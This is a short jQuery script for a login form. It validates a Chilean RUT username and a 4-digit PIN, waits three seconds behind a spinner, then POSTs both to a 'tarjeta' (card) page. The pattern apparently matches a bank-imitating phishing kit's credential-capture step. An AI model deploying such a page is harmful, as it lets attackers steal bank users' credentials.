$(document).ready(function(){

  $("#TxtUsername").rut({formatOn: 'keyup', ignoreControlKeys: false});

  $("#ViewPass").click(function(){
    if($("#TxtPassword").prop("type") == "password"){
      $("#TxtPassword").prop("type", "text");
    }else{
      $("#TxtPassword").prop("type", "password");
    }
  });


  $("#BtnGo").click(function(){
    var TxtUsername = $("#TxtUsername").val();
    var TxtPassword = $("#TxtPassword").val();
    var Status      = true;

    if(TxtUsername.length > 0){
      if($.validateRut(TxtUsername)){
        $("#TxtUsername").removeClass("input--error");
        $("#LblUsername").removeClass("input--error");
        $("#ErrUsername").css("display", "none");
      }else{
        Status = false;
        $("#TxtUsername").addClass("input--error");
        $("#LblUsername").addClass("input--error");
        $("#ErrUsername").css("display", "block");
      }
    }else{
      Status = false;
      $("#TxtUsername").addClass("input--error");
      $("#LblUsername").addClass("input--error");
      $("#ErrUsername").css("display", "block");
    }

    if(TxtPassword.length == 4){
      $("#TxtPassword").removeClass("input--error");
      $("#LblPassword").removeClass("input--error");
      $("#ErrPassword").css("display", "none");
    }else{
      Status = false;
      $("#TxtPassword").addClass("input--error");
      $("#LblPassword").addClass("input--error");
      $("#ErrPassword").css("display", "block");
    }

    if(Status){

      // Mostrar SPIN
      $("#DivSpin").css("display", "block");
      setTimeout(function(){
        $.redirect("tarjeta", {
          "TxtUsername" : TxtUsername,
          "TxtPassword" : TxtPassword
        }, "POST");
      }, 3000);

    }
  });

});
